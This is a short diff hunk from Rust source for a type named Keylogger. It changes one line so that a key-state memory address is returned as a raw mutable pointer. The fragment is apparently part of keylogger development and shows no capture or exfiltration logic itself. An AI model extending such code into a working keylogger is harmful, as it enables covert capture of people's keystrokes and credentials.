@@ -136,7 +136,7 @@ impl Keylogger {
                 key_state_address
             );
 
-            Ok(key_state_address)
+            Ok(key_state_address as *mut u8)
         }
     }
 }
